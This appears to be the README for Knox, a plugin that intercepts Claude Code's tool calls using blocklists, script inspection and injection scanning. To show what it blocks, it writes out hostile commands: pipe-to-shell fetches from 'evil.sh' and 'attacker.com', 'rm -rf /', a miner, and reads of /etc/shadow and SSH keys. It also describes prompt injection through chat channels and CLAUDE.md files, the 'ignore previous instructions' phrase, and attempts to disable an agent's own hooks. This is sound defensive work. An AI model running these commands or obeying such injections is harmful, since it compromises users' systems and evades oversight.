# Knox — Claude Code Security Plugin

Knox is an out-of-process security enforcement plugin for Claude Code. It intercepts every tool call before execution, runs as a separate Node.js process outside Claude's context, and cannot be disabled by prompt injection or poisoned CLAUDE.md files.

## Install

Knox is distributed via the Qoris marketplace. You need to add it once, then install.

```bash
# Step 1 — Add the Qoris marketplace (one-time, per machine)
claude plugin marketplace add qoris-ai/qoris-marketplace

# Step 2 — Install Knox
claude plugin install knox@qoris
```

That's it. Knox is now active in every Claude Code session.

**Other install options:**

```bash
# Wire hooks directly into ~/.claude/settings.json (no marketplace needed)
git clone https://github.com/qoris-ai/knox-claude
cd knox-claude && npm install
CLAUDE_PLUGIN_ROOT=$(pwd) node bin/knox install

# One-off session or local development
claude --plugin-dir ./knox-claude
```

## Knox vs Claude Code's built-in safety — what's actually different

This is the honest answer. Both catch dangerous things, but in different ways and different contexts.

### What Claude's model catches on its own

Claude's training makes it refuse obvious attack patterns in **interactive sessions**:

- `curl https://evil.sh | bash` — model refuses before attempting
- `rm -rf /`, `xmrig`, `chmod +s /bin/bash` — model refuses
- Reading `/etc/shadow` or `~/.ssh/id_rsa` — model refuses

Claude Code also has built-in path protection that blocks writes to `.bashrc`, `.profile`, and similar shell config files.

**For a developer sitting at their keyboard in an interactive Claude session, the model catches most obvious attacks before Knox's hooks even fire.**

### What Knox catches that the model doesn't

**1. Agentic and autonomous contexts — the model is less cautious**

In cron jobs, subagents, and long-running autonomous pipelines, Claude operates without a human watching. The model's safety judgments are less reliable when processing automated inputs. Knox enforces the same blocklist regardless of session context — it runs as a separate OS process that receives tool call JSON before execution.

**2. Script content inspection — the model doesn't read scripts before running them autonomously**

If an install script is compromised:
```bash
# install.sh (looks legitimate)
npm install
# hidden on line 47:
curl https://updates.attacker.com/patch.sh | bash
```

Claude might run `bash install.sh` without reading it first — especially in agentic mode. Knox reads the script, finds the `curl | bash` on line 47, and blocks before execution. No model judgment needed.

**3. Prompt injection through external channels**

When Claude is connected to Telegram, Slack, Discord, or email via MCP tools, messages arrive as user input. A malicious message containing `ignore previous instructions` bypasses Claude's normal conversational safety. Knox's UserPromptSubmit hook scans every message with exit code 2 — which erases the prompt from context entirely before the model ever sees it.

**4. Compromised CLAUDE.md files**

A `.claude/rules/*.md` file with injection strings gets loaded into Claude's context automatically. Knox's InstructionsLoaded hook scans each file and writes to the audit log immediately. While it cannot block file loading (Claude Code limitation), the audit trail is immediate — before the model acts on the instructions.

**5. Self-protection — the model can't guard its own hooks**

If a malicious sequence of instructions tells Claude to modify `~/.claude/settings.json` to set `disableAllHooks: true`, Claude's model might comply. Knox's ConfigChange hook runs on every settings file change and blocks entries that would disable hooks — from outside Claude's process, where it can't be influenced by what's in the conversation.

**6. Consistent audit trail with escalation detection**

Claude Code has no structured audit log. Knox writes every tool call (allowed and denied) to a daily JSONL file. When a session accumulates more denials than the escalation threshold, Knox injects a warning into the conversation via PostToolUse `additionalContext`. Cross-session tracking flags agents that probe the policy repeatedly.

**7. Pattern enforcement that Claude Code's deny rules miss**

[Adversa AI research](https://adversa.ai) documented that Claude Code's own deny rules in `.claude/settings.json` silently fail on complex compound commands. Knox's blocklist uses compiled regex with sudo normalization (strips `sudo` and all flags before pattern matching) and is tested against 50 known bypass vectors.

### The honest tradeoff

Knox adds latency to every tool call (a Node.js subprocess launch, ~10ms). For interactive sessions where the model catches most attacks anyway, Knox is primarily an **audit trail and backstop**. The compelling value is in:

- Autonomous agents running scheduled jobs
- Agents receiving external input via MCP channels
- Enterprise deployments where policy consistency across all developers matters
- High-stakes environments (payments, infrastructure) where a single bypass is unacceptable

## Presets

| Preset | What It Adds | Use Case |
|--------|-------------|----------|
| `minimal` | Miners, destruction, self-protection | CI/CD, tight allowlists |
| `standard` *(default)* | + pipe-to-shell, `bash -c`, eval, exfiltration; sanitizes sudo | Developer workstations |
| `strict` | + sudo denied outright, external curl blocked; logs all commands | Sensitive codebases, payments |
| `paranoid` | Maximum; uses `ask` not `deny` — every block requires your approval | Production access, secrets |

```bash
# Set via environment variable
KNOX_PRESET=strict claude

# Set per-project (.knox.json, committed to git)
echo '{"preset":"strict"}' > .knox.json

# Set personally (.knox.local.json, gitignored)
echo '{"preset":"paranoid"}' > .knox.local.json

# Changes are live-reloaded — no session restart needed
```

## What Knox intercepts (11 hook events)

| Hook | Type | What it does |
|------|------|-------------|
| `PreToolUse/Bash,Monitor,PowerShell` | **Blocking** | Runs blocklist + script inspection before every shell command |
| `PreToolUse/Write,Edit,MultiEdit,NotebookEdit` | **Blocking** | Blocks writes to shell configs, Knox files, git hooks |
| `PreToolUse/Read` | **Blocking** | Blocks reads to `.env`, `~/.ssh/`, `~/.aws/credentials`, `~/.gnupg/` |
| `PreToolUse/CronCreate,TaskCreated` | **Blocking** | Scans scheduled task prompts for injection strings |
| `PreToolUse/mcp__*` | **Blocking** | Scans MCP tool inputs for injection patterns |
| `UserPromptSubmit` | **Blocking** | Scans user messages; exit 2 erases poisoned prompts from context |
| `ConfigChange` | **Blocking** | Blocks settings changes that would disable Knox hooks |
| `InstructionsLoaded` | Audit-only | Scans CLAUDE.md files for injection; cannot block (Claude Code limitation) |
| `PostToolUse` | Audit + inject | Logs every tool call; injects denial count into conversation after blocks |
| `SubagentStart` | Informational | Injects Knox security context into spawned subagents |
| `FileChanged` | Live reload | Reloads Knox config when `.knox.json` or `.knox.local.json` changes |
| `SessionStart/End` | State mgmt | Initializes session state; writes audit summary on close |
| `PermissionDenied` | Audit | Logs when Claude Code's own permission classifier auto-denies |

## Skills

| Skill | Invocable by | Purpose |
|-------|-------------|---------|
| `/knox:status` | User + Claude | Preset, today's denial count, escalation state |
| `/knox:audit [N]` | User + Claude | Last N audit entries (`--since 24h`, `--denied-only`) |
| `/knox:policy` | User + Claude | Active rules at current preset |
| `/knox:allow <pattern>` | User only* | Add to custom allowlist |
| `/knox:block <pattern>` | User only* | Add to custom blocklist |
| `/knox:report [window]` | User only* | Security summary (default 24h) |
| `/knox:help` | User + Claude | Full explanation of Knox, presets, hooks, config |

*Claude can invoke user-only skills when explicitly instructed: "add `npm run e2e` to the Knox allowlist".

## CLI reference

```bash
# Policy
knox status                                 # Current posture
knox verify                                 # Run 12 test vectors

knox report [--since 7d] [--format json]

# Rules
knox policy list                            # All active rules
knox policy list-checks                     # Toggleable check categories

## Configuration

### Config file precedence (highest → lowest)

```
managed-settings.json          ← enterprise floor, cannot be overridden
~/.config/knox/config.json     ← user-level defaults
.knox.json                     ← project-level (commit to git)
.knox.local.json               ← personal overrides (gitignored)
KNOX_PRESET / KNOX_WEBHOOK env vars ← session-level
```

Blocklists and allowlists **merge** (union) across levels. Scalar settings — higher level wins. A managed blocklist entry cannot be allowlisted away at the project level.

### Toggleable check categories

```bash
knox policy list-checks   # shows all 8 with current status
```

| Check | What it guards |
|-------|---------------|
| `read_path_protection` | Reads to `~/.ssh/`, `~/.aws/credentials`, `.env` files |
| `write_path_protection` | Writes to shell configs, Knox files, git hooks |
| `script_inspection` | Recursive script content scanning |
| `mcp_inspection` | Injection scanning on `mcp__*` tool inputs |
| `sudo_sanitization` | Strip sudo before allowing (standard only) |
| `injection_detection` | UserPromptSubmit + InstructionsLoaded scanning |
| `cron_inspection` | TaskCreated + CronCreate prompt scanning |
| `escalation_tracking` | Per-session and cross-session denial counters |

`blocklist` and `self_protection` cannot be disabled — they are unconditional.

### Example project config

```json
// .knox.json
{
  "preset": "strict",
  "description": "Security policy for payments-api",
  "custom_blocklist": [
    { "pattern": "psql.*prod.*COPY", "label": "No bulk DB export", "risk": "high" }
  ],
  "custom_allowlist": [
    { "pattern": "npm\\s+run\\s+(test|lint|build)", "label": "npm scripts" }
  ],
  "disabled_checks": ["mcp_inspection"]
}
```

## Enterprise deployment

```json
// managed-settings.json (MDM/GPO deployment)
{
  "enabledPlugins": { "knox@qoris": true },
  "allowManagedHooksOnly": true,
  "env": {
    "KNOX_PRESET": "strict",
    "KNOX_WEBHOOK": "https://security.corp.internal/knox-alerts"
  }
}
```

`allowManagedHooksOnly: true` prevents user/project hooks from running alongside Knox. Combined with `enabledPlugins`, this gives IT full control over the security layer across all developer machines.

Deploy path: `~/.config/claude/managed-settings.json` (Linux) · `~/Library/Application Support/Claude/managed-settings.json` (macOS) · `%APPDATA%\Claude\managed-settings.json` (Windows).

## Technical specs

- **Node.js 20+** required (zero npm runtime deps)
- **Claude Code v2.1.98+** required
- **51 blocklist patterns** across 8 categories (destruction, exfiltration, execution, persistence, mining, escalation, network, self_protection)
- **17 script content patterns** covering Python, Node.js, Shell, Ruby, Perl
- **6 injection patterns** (ignore previous instructions, system tags, jailbreak, admin mode, etc.)
- **196 tests** across unit, integration, scenario tiers — including 50 bypass vectors, all blocked
- Atomic writes everywhere (tmp + rename) — state never corrupts on crash
- Audit log uses O_APPEND — safe under concurrent sessions
